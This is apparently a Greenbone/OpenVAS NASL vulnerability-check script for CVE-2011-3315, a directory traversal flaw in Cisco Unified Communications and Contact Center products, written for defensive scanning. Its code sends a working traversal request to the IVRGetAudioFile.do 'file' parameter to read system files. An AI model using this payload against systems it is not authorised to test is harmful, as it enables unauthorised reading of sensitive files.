if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103402" );
	script_bugtraq_id( 50372 );
	script_cve_id( "CVE-2011-3315" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Multiple Cisco Products 'file' Parameter () Directory Traversal Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-01-26 15:59:27 +0100 (Thu, 26 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_family( "CISCO" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50372" );
	script_xref( name: "URL", value: "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20111026-cucm" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/520414" );
	script_xref( name: "URL", value: "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20111026-uccx" );
	script_tag( name: "summary", value: "Multiple Cisco products are prone to a directory-traversal
  vulnerability." );
	script_tag( name: "impact", value: "Exploiting this issue will allow an attacker to read arbitrary files
  from locations outside of the application's current directory. This could help the attacker launch further attacks." );
	script_tag( name: "affected", value: "Cisco Unified IP Interactive Voice Response Cisco Unified Contact

  Center Express Cisco Unified Communications Manager" );
	script_tag( name: "insight", value: "This issue is tracked by Cisco BugID CSCts44049 and CSCth09343." );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for details." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(http_vuln_check( port: port, url: "/", pattern: "cisco", usecache: TRUE )){
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../" + file;
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( data: report, port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

